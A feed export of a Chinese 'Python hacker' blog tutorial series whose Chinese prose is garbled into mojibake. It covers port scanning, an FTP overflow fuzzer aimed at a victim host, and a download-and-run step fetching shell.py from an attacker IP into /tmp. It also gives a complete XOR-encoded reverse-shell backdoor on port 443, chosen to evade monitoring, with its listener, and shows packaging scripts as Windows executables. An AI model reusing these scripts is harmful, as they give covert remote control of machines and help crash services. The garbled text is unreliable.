ÊâßË°å‰∏äÈù¢ÁöÑÂëΩ‰ª§‰πãÂêéÔºåÂØºÂÖ•‰æùËµñÊñá‰ª∂Âπ∂‰∏îÁîüÊàê‰∏Ä‰∏™Êñ∞ÁöÑÊñá‰ª∂ÔºåËøô‰∏™Êñá‰ª∂ÈáåÈù¢ÂåÖÂê´‰∫Ü‰∏â‰∏™Êñá‰ª∂&lt;scriptName&gt;.txt,&lt;scriptName&gt;.specÂíå&lt;scriptName&gt;.exeÊñá‰ª∂ÔºåÂÖ∂‰∏≠.txt‰∏é.specÂèØ‰ª•Âà†Èô§ÊéâÔºåËÄå.exeÁöÑÊñá‰ª∂Â∞±ÊòØ‰Ω†ÈúÄË¶ÅÁöÑÊâßË°åÁ®ãÂ∫è. ÂÆåÊï¥ÁöÑÂ∞ÅË£ÖÊâßË°åÁ®ãÂ∫èPythonËÑöÊú¨Áé∞Âú®Â∑≤ÁªèË¢´ÁºñËØëÊàê‰∫Üwindows PEÊñá‰ª∂ÔºåÂπ∂‰∏î‰∏çÈúÄË¶ÅPythonËß£ÈáäÂô®Â∞±ËÉΩÂ§üÂú®windows‰∏ãÈù¢Áã¨Á´ãËøêË°åÔºåËøôÂèØ‰ª•ËÆ©‰Ω†Êõ¥ËΩªÊùæÁöÑÊääËÑöÊú¨ËøÅÁßªÂà∞windows‰∏äÈù¢ËÄå‰∏î‰∏çÁî®ÊãÖÂøÉ‰æùËµñÂåÖÁº∫Â§±ÁöÑÈóÆÈ¢ò. ‰∏Ä‰∏™ÁÆÄÂçïÁöÑËÑöÊú¨: 12345#!/usr/bin/python import os os.system("echo Hello World!") Áé∞Âú®Êàë‰ª¨Êää‰∏äÈù¢Ëøô‰∏™ËÑöÊú¨ÁºñËØëÊàê‰∏∫‰∏Ä‰∏™ÂèØ‰ª•ÊâßË°åÁöÑÊñá‰ª∂: Windows 1234c:\PathToPython\python.exe pyinstaller.py --onefile helloWorld.py &gt; helloWorld.exeHello World! Linux 1pytnstaller --onefile helloworld.py ÁîüÊàêÂêéÁöÑÂèØÊâßË°åÊñá‰ª∂Âú®distÊñá‰ª∂Â§π‰∏≠ Â¶ÇÊûú‰Ω†ÊÉ≥Êõ¥ËØ¶ÁªÜÁöÑ‰∫ÜËß£Ëøô‰∏™ËøáÁ®ãÔºåÂèØ‰ª•ÂèÇËÄÉBACK TO THE SOURCE CODE ‚Äì Forward/Reverse Engineering Python Malware Êää‰Ω†ÁöÑpythonËÑöÊú¨ÁºñËØëÊàê‰∏Ä‰∏™ÂèØ‰ª•Âú®windows‰∏äÈù¢ÂèØ‰ª•ÊâßË°åÁöÑÂèØÊâßË°åÁ®ãÂ∫èÊòØÂæàÊúâÁî®ÁöÑÔºåÂõ†‰∏∫ÂÆÉ‰∏çÈúÄË¶Å‰Ω†ÂÆâË£ÖpythonËß£ÈáäÂô®ËøòÊúâ‰æùËµñÂåÖ Â§ßÂÆ∂ÂèØ‰ª•Â∞ùËØï‰∏Ä‰∏ã0x3‰∏≠ÁöÑ‰æãÂ≠êÔºåÊääÈÇ£‰∏™ËÑöÊú¨ÁºñËØëÊàêÂèØÊâßË°åÁ®ãÂ∫è„ÄÇ‰∏ã‰∏ÄÁ´†]]></content>
      <categories>
        <category>Python</category>
        <category>Hacker</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[PythonÈªëÂÆ¢‰πãÊóÖ0x4]]></title>
    <url>%2F2015%2F10%2F16%2Fpythonhacker_0x4%2F</url>
    <content type="text"><![CDATA[ÁºñÂÜôFuzzÊµãËØïËÑöÊú¨ Ëøô‰∏ÄÁ´†Â∞Ü‰ºöÊºîÁ§∫Êïô‰Ω†Â¶Ç‰ΩïÂÜô‰∏Ä‰∏™Â±û‰∫éËá™Â∑±ÁöÑFuzzÊµãËØïËÑöÊú¨ÔºåÂΩìÊàë‰ª¨ËøõË°åexploitÁ†îÁ©∂ÂíåÂºÄÂèëÁöÑÊó∂ÂÄôÂ∞±ÂèØ‰ª•‰ΩøÁî®ËÑöÊú¨ËØ≠Ë®ÄÂèëÈÄÅÂ§ßÈáèÁöÑÊµãËØïÊï∞ÊçÆÁªôÂèóÂÆ≥ËÄÖÊú∫Âô®Ôºå‰ΩÜÊòØËøô‰∏™ÈîôËØØÊï∞ÊçÆÂæàÂÆπÊòìÂºïÂèëÂ∫îÁî®Á®ãÂ∫èÂ¥©Ê∫ÉÊéâ„ÄÇ ËÄåPythonÂç¥‰∏çÂêåÔºåÂΩìÁ®ãÂ∫èÂ¥©Ê∫É‰πãÂêéÔºåÊ≠§Êó∂‰Ω†ÁöÑÁ®ãÂ∫è‰ºöÊöÇÊó∂Êñ≠ÂºÄËøûÊé•ÔºåÈöèÂêé‰ºöÁ´ãÂç≥ÂàõÂª∫‰∏Ä‰∏™Êñ∞ÁöÑËøûÊé•ÁªßÁª≠ÊâßË°å„ÄÇ ‰∏ãÈù¢Êàë‰ª¨È¶ñÂÖàË¶ÅËß£ÂÜ≥ÁöÑÈóÆÈ¢òÊòØÂ∫îÁî®Á®ãÂ∫èÂ¶Ç‰ΩïÂ§ÑÁêÜÁî®Êà∑ËæìÂÖ•ÁöÑÂÜÖÂÆπÔºåÂõ†‰∏∫Âú®ËøõË°åÊ®°Á≥äÊµãËØïÁöÑÊó∂ÂÄôÔºåÊàë‰ª¨‰ºö‰∏çÂÆöÊó∂ÁöÑÊÉ≥Âà∞‰∏Ä‰∫õÊñ∞ÁöÑÊÄùË∑ØÁÑ∂ÂêéÊääÊï∞ÊçÆÂèëÈÄÅÁªôÂèóÂÆ≥ËÄÖÊú∫Âô®‰∏äÈù¢Êù•ÊµãËØïÔºåËøôÂü∫Êú¨ÊÄùË∑ØÂ∞±ÊòØÂÖà‰∏éÊúçÂä°Âô®Âª∫Á´ãËøûÊé•,ÁÑ∂ÂêéÂèëÈÄÅÊµãËØïÊï∞ÊçÆÁªôÊúçÂä°Âô®ÔºåÈÄöËøáwhileÂæ™ÁéØËØ≠Âè•Êù•Âà§Êñ≠ÊòØÂê¶ÊàêÂäüÔºåÂç≥‰ΩøÂá∫Áé∞ÈîôËØØ‰πü‰ºöÂ§ÑÁêÜÊéâ: ‰∏ãÈù¢ÊòØÊàë‰ª¨ÁöÑÊâ´ÊèèÂô®‰º™‰ª£Á†Å:1234567891011121314151617181920 #ÂØºÂÖ•socket,sysÊ®°ÂùóÔºåÂ¶ÇÊûúÊòØwebÊúçÂä°ÈÇ£‰πàËøòÈúÄË¶ÅÂØºÂÖ•httplib,urllibÁ≠âÊ®°Âùó &lt;import modules&gt; #ËÆæÁΩÆip/Á´ØÂè£#Ë∞ÉÁî®ËÑöÊú¨: ./script.py &lt;RHOST&gt; &lt;RPORT&gt;RHOST = sys.argv[1]RPORT = sys.argv[2] #ÂÆö‰πâ‰Ω†ÁöÑÊµãËØïÊï∞ÊçÆ,Âπ∂‰∏îËÆæÁΩÆÊµãËØïÊï∞ÊçÆËåÉÂõ¥ÂÄºbuffer = '\x41'*50 #‰ΩøÁî®Âæ™ÁéØÊù•ËøûÊé•ÊúçÂä°Âπ∂‰∏îÂèëÈÄÅÊµãËØïÊï∞ÊçÆwhile True: try: # ÂèëÈÄÅÊµãËØïÊï∞ÊçÆ # Áõ¥Âà∞ÈÄíÂ¢ûÂà∞50 buffer = buffer + '\x41'*50 except: print "Buffer Length: "+len(buffer) print "Can't connect to service...check debugger for potential crash" ‰∏äÈù¢Ëøô‰∏™ËÑöÊú¨Ê°ÜÊû∂ËÉΩÂ§üÈÄÇÁî®‰∫éÂêÑÁßçÊúçÂä°Ôºå‰Ω†ÂèØ‰ª•Ê†πÊçÆ‰Ω†ÁöÑÊúçÂä°(https,http,mysql,sshd)ÁºñÂÜôÁâπÂÆöÊ®°Á≥äÊµãËØïËÑöÊú¨.‰∏ãÈù¢Êàë‰ª¨ÊºîÁ§∫‰∏Ä‰∏™Âü∫‰∫éUSERÂëΩ‰ª§ÁöÑftpÊúçÂä°Âô®Ê®°Á≥äÊµãËØïËÑöÊú¨: Ê®°Á≥äÊµãËØïËÑöÊú¨123456789101112131415161718192021222324252627282930#ÂØºÂÖ•‰Ω†Â∞ÜË¶Å‰ΩøÁî®ÁöÑÊ®°ÂùóÔºåËøôÊ†∑‰Ω†Â∞±‰∏çÁî®ÂéªËá™Â∑±ÂÆûÁé∞ÈÇ£‰∫õÂäüËÉΩÂáΩÊï∞‰∫Üimport sys, socketfrom time import sleep #Â£∞ÊòéÁ¨¨‰∏Ä‰∏™ÂèòÈáètargetÁî®Êù•Êé•Êî∂‰ªéÂëΩ‰ª§Á´ØËæìÂÖ•ÁöÑÁ¨¨‰∏Ä‰∏™ÂÄºtarget = sys.argv[1]#ÂàõÂª∫50‰∏™AÁöÑÂ≠óÁ¨¶‰∏≤ '\x41'buff = '\x41'*50 # ‰ΩøÁî®Âæ™ÁéØÊù•ÈÄíÂ¢ûËá≥Â£∞ÊòébuffÂèòÈáèÁöÑÈïøÂ∫¶50while True: #‰ΩøÁî®"try - except"Â§ÑÁêÜÈîôËØØ‰∏éÂä®‰Ωú try: # ËøûÊé•ËøôÁõÆÊ†á‰∏ªÊú∫ÁöÑftpÁ´ØÂè£ 21 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) s.settimeout(2) s.connect((target,21)) s.recv(1024) print "Sending buffer with length: "+str(len(buff)) #ÂèëÈÄÅÂ≠óÁ¨¶‰∏≤:USERÂπ∂‰∏îÂ∏¶ÊúâÊµãËØïÁöÑÁî®Êà∑Âêç s.send("USER "+buff+"\r\n") s.close() sleep(1) #‰ΩøÁî®Âæ™ÁéØÊù•ÈÄíÂ¢ûÁõ¥Ëá≥ÈïøÂ∫¶‰∏∫50 buff = buff + '\x41'*50 except: # Â¶ÇÊûúËøûÊé•ÊúçÂä°Âô®Â§±Ë¥•ÔºåÊàë‰ª¨Â∞±ÊâìÂç∞Âá∫‰∏ãÈù¢ÁöÑÁªìÊûú print "[+] Crash occured with buffer length: "+str(len(buff)-50) sys.exit() ‰∏äÈù¢ËøôÊÆµ‰ª£Á†ÅÊºîÁ§∫‰∫Ü‰∏Ä‰∏™Âü∫Êú¨ÁöÑFuzzÊµãËØïËÑöÊú¨Ôºå‰ΩÜÊòØÂÄºÂæóÊ≥®ÊÑèÁöÑÊòØÊâßË°å‰∏äÈù¢ÁöÑ‰ª£Á†ÅÔºåÊèê‰∫§\x41Â≠óÁ¨¶ÂèØËÉΩ‰∏ç‰ºöËÆ©‰Ω†ÊàêÂäüÁöÑÊãø‰∏ãÂèóÂÆ≥‰∏ªÊú∫Ôºå‰ΩÜÊòØ‰Ω†ÂèØ‰ª•Â∞ùËØïÁªÑÂêà‰∏Ä‰∫õÂÖ∂‰ªñÁöÑÂ≠óÁ¨¶(Áî®Êà∑ËØçÂÖ∏).Ê≠§Â§ñËøòÊúâ‰∏Ä‰∏™Êõ¥Âä†Âº∫Â§ßÁöÑFuzzÊµãËØïÂ∑•ÂÖ∑SpikeÂíåÂÖ∑‰Ωì‰ªãÁªç‰∏éÊºîÁ§∫,ÂÆÉÂèØ‰ª•‰∏ÄÊ¨°ÊÄßÁöÑÊµãËØïÂ§ßÈáèÊï∞ÊçÆÔºåÂπ∂‰∏îËÉΩËÆ©‰Ω†ÊèêÈ´òÊàêÂäüÊ¶ÇÁéá. ÁªÉ‰π†Â§ßÂÆ∂ÂèØ‰ª•Êää‰∏äÈù¢ÁöÑftpÊµãËØïÊç¢ÊàêhttpÊµãËØïÔºåËøôÈáåÊèêÁ§∫:‰Ω†ÂèØËÉΩÈúÄË¶Å‰ΩøÁî®httplib/urllib.‰∏ã‰∏ÄÁ´†]]></content>
      <categories>
        <category>Python</category>
        <category>Hacker</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[PythonÈªëÂÆ¢‰πãÊóÖ0x3]]></title>
    <url>%2F2015%2F10%2F15%2Fpythonhacker_0x3%2F</url>
    <content type="text"><![CDATA[ÂèçÂêëshell ÂèÇËÄÉÈòÖËØª:‰ªÄ‰πàÊòØÂèçÂêëShell ËøôÁØáÊïôÁ®ãÂ∞Ü‰ºöÊïô‰Ω†‰ΩøÁî®PythonÁºñÂÜô‰∏Ä‰∏™ÂèçÂêëshellÔºåÈ¶ñÂÖàÊàë‰ª¨ÂÖàÊºîÁ§∫‰ΩøÁî®PythonÂ¶Ç‰ΩïÂà©Áî®webÊúçÂä°Âô®ÁöÑÂäüËÉΩÔºåÊääÊñá‰ª∂‰ªéÂè¶‰∏ÄÂè∞‰∏ªÊú∫‰º†ÈÄÅËøáÊù•„ÄÇÊàë‰ª¨ÂÅáËÆæ‰Ω†Êúâ‰∏ÄÂè∞ÂÇÄÂÑ°‰∏ªÊú∫Ôºå‰Ω†Áé∞Âú®ÊÉ≥‰∏ãËΩΩÂÇÄÂÑ°Êú∫‰∏äÈù¢ÁöÑÁöÑÊñá‰ª∂„ÄÇÈÇ£‰πà‰Ω†Â∞±ÂèØ‰ª•‰ΩøÁî®shell(Êàñmeterpreter)ÂéªËÆøÈóÆËøôÂè∞ÂÇÄÂÑ°Êú∫Ôºå‰Ω†ÂèØ‰ª•ÈÄöËøá‰∏ÄË°åPython‰ª£Á†ÅÊääÂÇÄÂÑ°Êú∫Âª∫Á´ãÊàê‰∏∫‰∏Ä‰∏™webÊúçÂä°Âô®ÔºåÁÑ∂Âêé‰∏ãËΩΩÂÇÄÂÑ°Êú∫‰∏äÈù¢ÁöÑÊñá‰ª∂. ÂàõÂª∫‰∏Ä‰∏™python HTTPÊúçÂä°Âô®ÂèØ‰ª•Áõ¥Êé•‰ΩøÁî®pythonÁöÑÂÜÖÂª∫ÂáΩÊï∞‚ÄùSimpleHTTPServer‚ÄùÊù•ÂàõÂª∫Ôºå‰Ω†ÂèØ‰ª•‰ΩøÁî®‚Äô-m‚ÄôÂèÇÊï∞Áõ¥Êé•Âú®ÂëΩ‰ª§Ë°åË∞ÉÁî®Ê®°ÂùóÔºåÂàõÂª∫ÁöÑÊúçÂä°Âô®ÈªòËÆ§ÊòØÁõëÂê¨ÁöÑ8000Á´ØÂè£Ôºå‰ΩÜÊòØ‰Ω†ÂèØ‰ª•ÊåáÂÆöÁ´ØÂè£ÔºåÁõ¥Êé•Âú®‚ÄôSimpleHTTPServer‚ÄôÂêéÈù¢Ë∑ü‰∏Ä‰∏™Á´ØÂè£ÂèÇÊï∞: 12python -m SimpleHTTPServer 80Serving HTTP on 0.0.0.0 80 ... Êàë‰ª¨ÂÅáËÆæ‰Ω†Ê≤°ÊúâÈò≤ÁÅ´Â¢ôÂéªÈòªÊ≠¢‰Ω†ÁöÑËøûÊé•ÔºåÈÇ£‰πà‰Ω†ÊòØÂèØ‰ª•ËØ∑Ê±ÇÂà∞ËøôÊúçÂä°Âô®ÁöÑÊï∞ÊçÆ„ÄÇ‰Ω†ÂèØ‰ª•Âú®‰ªª‰ΩïÁõÆÂΩïÈáåÈù¢ÂéªÂêØÂä®Python HTTPÊúçÂä°Âô®ÔºåËøôÊ†∑‰Ω†Â∞±ËÉΩÂ§üÈÄöËøáÊµèËßàÂô®ÊàñËÄÖÊòØËøúÁ®ãÂÆ¢Êà∑Á´ØÊù•ËÆøÈóÆËøô‰∏™ÁõÆÂΩï„ÄÇËøôÈáåÊúâ‰∏Ä‰∏™ÁÆÄÂçïÁöÑ‰æãÂ≠êÂëäËØâ‰Ω†‰ΩøÁî®wgetÂ∑•ÂÖ∑ÂéªËé∑ÂèñÊñá‰ª∂,‰ΩÜÊòØÊúâ‰∫õÊó∂ÂÄôÂ∞±‰ºöÁªèÂ∏∏ÂèëÁé∞‰Ω†Ê†πÊú¨Ê≤°ÊúâÊùÉÈôêÂú®ÂΩìÂâçÁõÆÂΩïÂÜôÂÖ•Êñá‰ª∂Âπ∂‰∏îÂàùÂßãÂåñËøô‰∏™ËÑöÊú¨Ôºå‰ΩÜÊòØ‰Ω†ÂèØ‰ª•ÊîπÂèòËÑöÊú¨ÊâßË°åÁöÑÁõÆÂΩïÔºå‰∏ãÈù¢Ëøô‰∏™‰æãÂ≠êÂ∞±ÊºîÁ§∫‰∫ÜÊääËÑöÊú¨Âú®/tmpÁõÆÂΩï‰∏ãÈù¢ÊâßË°åÔºö 1234567891011#‰ΩøÁî®-OÂèÇÊï∞ÔºåÊääÊñá‰ª∂‰øùÂ≠òÂú®ÂÖ∂‰ªñÁõÆÂΩï- /tmp/ ‰∏ÄËà¨ÂèØÂÜôwget -O /tmp/shell.py http://&lt;attacker_ip&gt;/shell.py #‰øÆÊîπÊùÉÈôêchmod a+x /tmp/shell.py # ‰ΩøÁî®fileÂëΩ‰ª§Ê£ÄÊü•Êñá‰ª∂ÊòØÂê¶Ê≠£Á°Æfile /tmp/shell.py #ÊâßË°åËÑöÊú¨/usr/bin/python /tmp/shell.py ÂÆ¢Êà∑Á´ØÂèçÂêëshell‰ª£Á†ÅÈòÖËØª‰∏ãÈù¢ÁöÑÂêéÈó®‰ª£Á†Å„ÄÇÁºñÁ†ÅÊó∂‰ºö‰ΩøÁî®Âà∞socketÔºåsubprocessÂíåsysÊ®°ÂùóÔºåÈÄâÊã©subprocessÊ®°ÂùóÂéüÂõ†ÔºåÊòØÂõ†‰∏∫ÂÆÉÂÖÅËÆ∏‰ΩøÁî®‰∏Ä‰∏™ÂèòÈáèÂÇ®Â≠òSTDOUTËæìÂá∫ÁöÑÁªìÊûúÔºå‰πãÂêéÂèØ‰ª•Âú®‰ª£Á†Å‰∏≠ÁöÑÂÖ∂‰ªñÈÉ®ÂàÜÈÄöËøáË∞ÉÁî®Ê≠§ÂèòÈáèËÆøÈóÆ‰øùÂ≠òÁöÑSTDOUTÊï∞ÊçÆ„ÄÇ‰∏ãÈù¢ÁöÑ‰ª£Á†Å‰∏≠ÔºöÊâÄÂª∫Á´ãÁöÑËøûÊé•‰ºöÁõëÂê¨443Á´ØÂè£„ÄÇ443Á´ØÂè£ÁªèÂ∏∏Áî®Âú®https‰∏äÔºåËøôÈáå‰ΩøÁî®443Á´ØÂè£ÂèØ‰ª•Ëµ∑Âà∞Ê∑∑Ê∑ÜËßÜÂê¨ÁöÑ‰ΩúÁî®: 1234567891011121314151617181920212223242526272829#!/usr/bin/python import socket,subprocess,sys RHOST = sys.argv[1]RPORT = 443s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)s.connect((RHOST, RPORT)) while True: # ‰ªésocket‰∏≠Êé•Êî∂XORÁºñÁ†ÅÁöÑÊï∞ÊçÆ data = s.recv(1024) # XOR the data again with a '\x41' to get back to normal data en_data = bytearray(data) for i in range(len(en_data)): en_data[i] ^=0x41 # ÊâßË°åËß£Á†ÅÂëΩ‰ª§ÔºåsubprocessÊ®°ÂùóËÉΩÂ§üÈÄöËøáPIPE STDOUT/STDERR/STDINÊääÂÄºËµãÂÄºÁªô‰∏Ä‰∏™ÂèòÈáè comm = subprocess.Popen(str(en_data), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) comm.wait() STDOUT, STDERR = comm.communicate() # ËæìÂá∫ÁºñÁ†ÅÂêéÁöÑÊï∞ÊçÆÂπ∂‰∏îÂèëÈÄÅÁªôÊåáÂÆöÁöÑ‰∏ªÊú∫RHOST en_STDOUT = bytearray(STDOUT) for i in range(len(en_STDOUT)): en_STDOUT[i] ^=0x41 s.send(en_STDOUT)s.close() ‰∏äÈù¢ÁöÑ‰ª£Á†Å‰∏≠Êúâ‰∫õÊ¶ÇÂøµÂ∑≤ÁªèÂú®0x2‰ªãÁªçËøá‰∫ÜÔºå‰ΩÜÊòØÈô§‰∫Ü‰πãÂâçÁöÑ‰ΩøÁî®socketÂàõÂª∫‰∏Ä‰∏™ËøûÊé•‰πãÂ§ñÔºåÊàë‰ª¨ÈÄöËøásubprocessÊ®°ÂùóÊâßË°å‰∫Ü‰∏Ä‰∏™ÂëΩ‰ª§ÔºåsubprocessÊ®°ÂùóÈùûÂ∏∏ÁöÑÊñπ‰æøÔºåÂÆÉÂÖÅËÆ∏‰Ω†ÈÄöËøáSTDOUT/STDERRÂëΩ‰ª§Áõ¥Êé•ÊääÂÄºËµãÂÄºÁªô‰∏Ä‰∏™ÂèòÈáèÔºåÁÑ∂ÂêéÊàë‰ª¨ÂèØ‰ª•ÈÄöËøáÂëΩ‰ª§ÊääËæìÂá∫ÁöÑËøõË°åÁºñÁ†ÅÁÑ∂ÂêéÈÄöËøásocketÁΩëÁªúÂèëÈÄÅÂá∫Âéª„ÄÇ ‰ΩøÁî®OXRÁöÑÂ•ΩÂ§ÑÂ∞±ÊòØ‰Ω†ËÉΩÂ§üÂæàÂÆπÊòìÁºñÁ†Å‰Ω†Ë¶ÅÂèëÈÄÅËøáÂéªÁöÑÊï∞ÊçÆÔºåÁÑ∂ÂêéÈÄöËøáÁõ∏ÂêåÁöÑÂØÜÈí•Êù•Ëß£Á†ÅËøîÂõûÁöÑÊï∞ÊçÆÔºåÊúÄÂêéËß£Á†ÅÂêéÁöÑÊï∞ÊçÆÂèØ‰ª•‰ª•ÊòéÊñáÁöÑÂΩ¢ÂºèÂéªÊâßË°åÂëΩ‰ª§„ÄÇ ÊúçÂä°Á´ØÁõëÂê¨shell‰ª£Á†ÅÁé∞Âú®‰∏∫‰∫ÜÂà©Áî®Â•ΩËøô‰∏™ÂêéÈó®ÔºåÊàë‰ª¨ÈúÄË¶Å‰∏Ä‰∏™ÁõëÂê¨ËÑöÊú¨Âπ∂‰∏îËß£Á†ÅÂêéÁ´Ø‰º†ËæìËøáÊù•ÁöÑÊï∞ÊçÆÔºåËÆ©Êàë‰ª¨ÈÄöËøáÊòéÊñáÂæàÊ∏ÖÊô∞ÁöÑÁúãÊ∏ÖÊ•öËøîÂõûÁöÑÊï∞ÊçÆ„ÄÇ ‰∏ãÈù¢Êàë‰ª¨Â∞ÜË¶ÅËÆæËÆ°‰∏Ä‰∏™ÁõëÂê¨Âô®„ÄÇÊù•Ëé∑ÂèñÂèçÂêëshellÁöÑÊï∞ÊçÆÔºåÂπ∂‰∏îËÉΩÂ§üÂØπ‰∫éËæìÂÖ•ÔºèËæìÂá∫ÁöÑËøõË°åËß£Á†Å/ÁºñÁ†ÅÔºå‰∏∫‰∫ÜËÉΩÂ§üÂú®ÁªàÁ´Ø‰∏äÈù¢ËÉΩÂ§üÂæàÊ∏ÖÊô∞ÁöÑÁúãÂá∫Êù•ÔºåÊâÄ‰ª•ÈúÄË¶Å‰ΩøÁî®XORÁºñÁ†Å: 1234567891011121314151617181920212223import socket s= socket.socket(socket.AF_INET, socket.SOCK_STREAM)s.bind(("0.0.0.0", 443))s.listen(2)print "Listening on port 443... "(client, (ip, port)) = s.accept()print " Received connection from : ", ipwhile True: command = raw_input('~$ ') encode = bytearray(command) for i in range(len(encode)): encode[i] ^=0x41 client.send(encode) en_data=client.recv(2048) decode = bytearray(en_data) for i in range(len(decode)): decode[i] ^=0x41 print decode client.close()s.close() ËøôÁ´†ÁöÑ‰æãÂ≠êÈùûÂ∏∏ÊúâË∂£ÔºåÂØπ‰∫éÂ≠¶‰π†‰ø°ÊÅØÂÆâÂÖ®ÁöÑÊúãÂèãÈÉΩÂñúÊ¨¢shellÔºåÂ§ßÂÆ∂ÂèØ‰ª•ÂØπ‰ª£Á†ÅÂÅöÁÇπ‰øÆÊîπËÆ©Ëøô‰∏™ËÑöÊú¨‰πüËÉΩÂ§üÂú®window‰∏äÈù¢‰πüËÉΩÂ§üÊ≠£Â∏∏ËøêË°åÔºåÊúÄÂêéÂ§ßÂÆ∂ÂèØ‰ª•‰ΩøÁî®base64Êù•‰ª£ÊõøXORËøõË°åÁºñÁ†Å‰∏éËß£Á†ÅÔºåËøô‰∫õÁªÉ‰π†ËÆ©‰Ω†‰Ω†Êõ¥Âä†ÁÜüÁªÉÁöÑ‰ΩøÁî®python.‰∏ã‰∏ÄÁ´†]]></content>
      <categories>
        <category>Python</category>
        <category>Hacker</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[PythonÈªëÂÆ¢‰πãÊóÖ0x2]]></title>
    <url>%2F2015%2F10%2F14%2Fpythonhacker_0x2%2F</url>
    <content type="text"><![CDATA[Á´ØÂè£Êâ´ÊèèËøô‰∏ÄÁ´†Â∞Ü‰ºöÊºîÁ§∫Â¶Ç‰ΩïÈÄöËøáPythonÁöÑÁΩëÁªúËøûÊé•Êù•ÂºÄÂèë‰∏Ä‰∏™Âü∫Á°ÄÁöÑÁ´ØÂè£Êâ´ÊèèÂô®,Êàë‰ª¨ÁöÑËÆæËÆ°ÊÄùË∑ØÊòØ‰ΩøÁî®socket‰∏ÄÈÅçÂèà‰∏ÄÈÅçÁöÑÂéªËøûÊé•ip‰∏éÁ´ØÂè£ÁöÑÁªÑÂêàÁöÑÊñ∞ÂÄº,‰∏∫‰∫ÜÊñπÈù¢Êàë‰ª¨ËÉΩÂ§üÂø´ÈÄüÁöÑÂÆåÊàêÂÆÉÔºåÈ¶ñÂÖàÈúÄË¶Å‰ªãÁªç‰∏ÄÁÇπÊñ∞ÁöÑÊ¶ÇÂøµ,forÂæ™ÁéØ: 12345678910111213141516171819202122232425262728&gt;&gt;&gt;&gt;&gt;&gt; for port in range(1000,1024):... print "[+] The port is: "+str(port)...[+] The port is: 1000[+] The port is: 1001[+] The port is: 1002[+] The port is: 1003[+] The port is: 1004[+] The port is: 1005[+] The port is: 1006[+] The port is: 1007[+] The port is: 1008[+] The port is: 1009[+] The port is: 1010[+] The port is: 1011[+] The port is: 1012[+] The port is: 1013[+] The port is: 1014[+] The port is: 1015[+] The port is: 1016[+] The port is: 1017[+] The port is: 1018[+] The port is: 1019[+] The port is: 1020[+] The port is: 1021[+] The port is: 1022[+] The port is: 1023 Ê≥®ÊÑè‰∏äÈù¢ÈÇ£ÊÆµ‰ª£Á†ÅÂú®Âæ™ÁéØ‰ΩìÂÜÖÁöÑÁº©ËøõÔºåÈÄöÂ∏∏ÊÉÖÂÜµ‰∏ãÊòØÁ©∫‰∏§Ê†ºÊàñ‰∏Ä‰∏™tabÈîÆÔºå‰ΩÜËøôÈÉΩÊ≤°ÊúâÂÖ≥Á≥ªÔºåÂè™Ë¶Å‰Ω†ÁöÑÊï¥‰∏™‰ª£Á†Å‰∏ÄÁõ¥Â∞±ÂèØ‰ª•‰∫Ü„ÄÇÊàë‰πàÊâÄÂÜôÁöÑÈÇ£‰∏™ÁÆÄÁü≠ÁöÑÁ´ØÂè£Êâ´ÊèèÂô®ÁöÑÊ†∏ÂøÉ‰ª£Á†Å‰ºöÂÜôÂú®‰∏äÈù¢‰ª£Á†Å‰∏≠ÁöÑËæìÂá∫ÂùóÈÉ®ÂàÜÔºåÁÑ∂ÂêéÂª∫Á´ã‰∏Ä‰∏™socketËøûÊé•„ÄÇ‰∏ãÈù¢ÁöÑ‰ª£Á†ÅÂ∞±ÊºîÁ§∫‰∫ÜÂ¶Ç‰Ωï‰ΩøÁî®ÂÜÖÂª∫ÁöÑsocketÊ®°ÂùóÂéªÂª∫Á´ã‰∏Ä‰∏™socketËøûÊé•Ôºö 12345678910&gt;&gt;&gt;&gt;&gt;&gt; import socket&gt;&gt;&gt;&gt;&gt;&gt; s = socket.socket()&gt;&gt;&gt; s.connect(('127.0.0.1s', 22))&gt;&gt;&gt; s.send('Primal Security \n')17&gt;&gt;&gt; banner = s.recv(1024)&gt;&gt;&gt; print bannerOpenSSH ‰∏äÈù¢Ëøô‰∏™‰æãÂ≠êÔºöÊàë‰ª¨ÂÖàimportËøôsocketÊ®°ÂùóÂπ∂‰∏îË∞ÉÁî®connect()ÂáΩÊï∞ÂéªËøûÊé•ÊåáÂÆöÁöÑIPÂú∞ÂùÄ‰∏éÁ´ØÂè£„ÄÇÂÆÉÂ∞±‰ºöÂª∫Á´ã‰∏Ä‰∏™TCPËøûÊé•(SYN/SYN-ACK/ACK)Âπ∂‰∏îÊàë‰ª¨ÂÜçÈÄöËøásend()ÂáΩÊï∞ÁªôÊúçÂä°Âô®ÂèëÈÄÅ‰∏Ä‰∏™ÁúüÂÆûÁöÑÊï∞ÊçÆÔºåÁÑ∂Âêé‰ΩøÁî®recv()ÊâìÂç∞Âá∫ÂìçÂ∫îÁöÑÂÜÖÂÆπ„ÄÇÁé∞Âú®ÊïôÂ§ßÂÆ∂Â¶Ç‰ΩïÂÆπÈîôsocketÔºåÂØπ‰∫é‰∏çËÉΩÊâìÂºÄÁöÑËøûÊé•: 123456&gt;&gt;&gt;&gt;&gt;&gt; s.connect(('127.0.0.1', 23))Traceback (most recent call last): File "&lt;stdin&gt;", line 1, in ? File "&lt;string&gt;", line 1, in connectsocket.error: (111, 'Connection refused') ÂØπ‰∫é‰∏äÈù¢ÁöÑÈîôËØØÊúâËã•Âπ≤‰∏≠Â§ÑÁêÜÊñπÂºèÔºåËøôÈáåÊàë‰ª¨‰ΩøÁî®ÊúÄÁÆÄÂçïÁöÑ‰∏ÄÁßçÊñπÂºèÔºö‰ΩøÁî®try/exceptÂæ™ÁéØÊù•Â§ÑÁêÜÈîôËØØ: 123456&gt;&gt;&gt;&gt;&gt;&gt; try:... s.connect(('127.0.0.1', 23))... except: pass...&gt;&gt;&gt; 